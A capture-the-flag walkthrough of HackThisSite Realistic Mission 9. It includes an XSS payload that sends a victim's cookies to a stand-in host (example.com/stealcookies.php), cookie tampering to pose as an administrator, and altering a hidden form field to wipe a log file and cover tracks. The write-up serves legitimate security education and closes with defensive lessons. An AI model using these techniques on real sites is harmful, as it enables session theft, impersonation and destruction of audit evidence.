# Mission 9
https://www.hackthissite.org/playlevel/9/

- [Overview](#overview)
- [Solution](#solution)
  * [Details From the Site Layout](#details-from-the-site-layout)
  * [Paying Our Friend's Salary](#paying-our-friend-s-salary)
    + [Stealing Your Boss' Cookies](#stealing-your-boss--cookies)
  * [Clearing the Logs](#clearing-the-logs)
- [Key Concepts](#key-concepts)
- [Key Ideas](#key-ideas)

## Overview
The boss over at CrappySoft has stopped paying his employees, and your friend is in need of money, fast. Help them get their salary paid.

Message: Hey man,
I've heard you're good at hacking, and on the right side of things. So I came looking for you. I really need help, you see, my boss has stopped paying our salaries and I'm going to miss my rent! Please help me get my money, you can reach the site at Crappy Soft. They have an online payment system, but only he can use it. Maybe you can get into his account somehow, but for now you can use mine:

Username: r-conner@crappysoft.com
Password: ilovemywork

Thanks man, good luck.

## Solution
### Details From the Site Layout
Before focusing on paying the salary let's take stock of the site itself. Take a look at the pages we can access without needing to log in. Contact leads to a generic form to send a message to the company, nothing fancy there. But the Mailing List and Demo pages drop an important clue. On the Mailing List page, it's the form which has this line: `<input type="hidden" name="strFilename" value="./files/mailinglist/addresses.txt">`. On the Demo page, the download link has this line: `<a href="./files/downloads/CrappyDemo.exe.zip"><font color="BLACK"><b>HERE!</b></font></a>`.

Try accessing https://www.hackthissite.org/playlevel/9/files/ and boom, directory listing is on. Click through the folders and you'll notice a log file at ./files/logs/logs.txt. It seems to record login data. Thinking back to our steps in [Realistic Mission 8](https://github.com/jasonally/hack_this_site_missions/blob/master/realistic/mission_08.md), we'll probably need to clear logs in this mission as well once we pay our friend.

We've learned an important insight, but for now, let's focus on paying our friend's salary.

### Paying Our Friend's Salary
Log into our friend's account from the CrappySoft homepage using the account credentials he provided. Once we're logged in, you'll notice a cookie gets saved to our browser with the following information:
* intID, currently equal to 2
* strPassword, which seems to be the MD5 hash of our friend's password
* strUsername, which is set to r-conner%40crappysoft.com (note the URL encoding for the @ sign)

There's also now a link on the lefthand side of the page labeled Pay Salaries. Click it right now and you'll get a message saying: You are not an administrator.

I spent a while looking into [privilege escalation](https://portswigger.net/web-security/access-control), my thinking being that maybe there was some way to give our friend's account administrator privileges and then be able to pay his salary. That approach didn't really pan out, but it turns out I was on the right track.

#### Stealing Your Boss' Cookies
It turns out there's more than you might initially think to the site's Private Message functionality. The functionality is actually vulnerable to a [Cross-Site Scripting](https://en.wikipedia.org/wiki/Cross-site_scripting) (XSS) attack, meaning we can inject JavaScript into a page and execute it in another user's browser. In this case, we can use XSS to steal the boss' login cookie.

Compose a message to m-crap (owner), add a subject, add the following message body, and click Send:
`javascript:void(window.location='http://example.com/stealcookies.php?'+document.cookie)`

It's beyond the scope of this mission to actually execute an XSS attack, so we've got to simulate it and think through it to the best of our ability. When the boss opens your message, his browser will execute this code (because the web application doesn't properly filter out rogue JavaScript) and it will redirect his browser to http://example.com/stealcookies.php?[his_login_cookie]. In this simulation the idea would be that you control the site in question – which in this case is example.com – and stealcookies.php is a script which would save your boss' cookie for you to retrieve later. The script might just save the data to a database, it might email it to you, or something along those lines.

Once you send the message you'll see some more text appear on the page saying something like this:
It's beyond the scope of this mission to check the XSS. So, assume you got this cookie:
strUsername=m-crap%40crappysoft.com; strPassword=94a35a3b7befff5eb2a8415af04aa16c; intID=1;

Again, it's beyond the scope of this mission for us to actually execute a XSS attack, so we just got the cookie information provided to us. We could have probably guessed the boss would have intID=1, but we wouldn't have known his password (either the plain text version or the hashed version). But now we've got it all. Update your cookie to reflect the indID, strPassword, and strUsername values we've now obtained and we're now effectively logged in as the boss. Click the Pay Salaries link and click the Pay button next to your friend's email address to pay him.

### Clearing the Logs
Once we've paid our friend we'll see a message telling us to clean the logs by subscribing to them. This goes back to what we saw earlier, before logging in. We need to clear the site logs to help cover our tracks.

Luckily, our initial investigation makes it much easier for us to figure out how to accomplish these steps. If we go to the Mailing List page, there's this message:
(Note: This adds your email to the list, and at the same time, checks the list for anything without the '@' character and deletes it.)

We identified previously that the logs file we're trying to clear is located at ./files/logs/logs.txt. So, change the value of the hidden input type to that file path, click Subscribe, and you're done. This functionality will clear the log file and we've completed the mission.

## Key Concepts
Cookie tampering
Cookie stealing
Cross-site scripting (XSS)

## Key Ideas
It shouldn't be so easy for someone to tamper with a cookie, and that was what really allowed us to complete the mission. Modern practices call for things like authentication cookies which the backend validates to make sure a user isn't editing a cookie's values in their browser.

But this mission also gave us an example of XSS, which continues to be a major web security issue. Any time someone can inject rogue JavaScript onto a page which can then be executed in the browser of another user, that's a big problem. There's no shortage of malicious things an attacker can do using an XSS bug, but stealing cookies is a common one. That's why companies often allocate major resources -- including paying cash rewards -- to people who identify and report XSS vulnerabilities.